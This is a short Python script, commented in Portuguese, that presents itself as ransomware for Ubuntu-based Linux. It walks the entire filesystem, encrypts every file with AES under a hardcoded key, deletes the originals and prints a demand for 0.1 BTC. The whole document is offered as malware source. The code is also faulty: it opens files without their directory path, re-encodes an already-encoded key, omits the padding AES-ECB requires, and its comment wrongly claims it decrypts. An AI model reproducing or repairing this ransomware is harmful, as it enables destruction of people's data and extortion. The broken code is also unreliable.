#!/usr/bin/env python

# ransomware para sistemas Linux baseados no Ubuntu
# Copyright (C) <ano> <seu-nome>

# use a biblioteca Crypto para criptografar arquivos
from Crypto.Cipher import AES
import os, os.path
import time

# uma chave secreta para criptografar/descriptografar
# é recomendado usar uma cadeia de caracteres extremamente difícil de desvendar
key = 'someverysecretkey12345'

# localiza todos os arquivos no sistema de arquivos
# e criptografa/descriptografa dependendo se o arquivo já foi criptografado
for root, dirs, files in os.walk('/'):
    for fname in files:
        # crie o nome do arquivo criptografado
        cname = os.path.join(root, fname + '.encrypted')

        # criptografa/descriptografa
        with open(fname, 'rb') as rf:
            data = rf.read()

            # redimensionar a chave para 16 bytes para servir de base para o AES
            key = key.encode()
            key16 = key[:min(len(key), 16)]

            # criptografar os dados
            cipher = AES.new(key16, AES.MODE_ECB)
            encdata = cipher.encrypt(data)
            with open(cname, 'wb') as wf:
                wf.write(encdata)

            # remover o arquivo original
            print("Criptografando arquivo %s..." % fname)
            os.remove(fname)

# Informar o início do processo de criptografia
print("Criptografia Iniciada em %s" % time.asctime())
# exibe a nota de resgate
print("\nSe desejar a chave para descriptografar seus arquivos, envie 0.1 BTC para meu endereço Bitcoin\n")
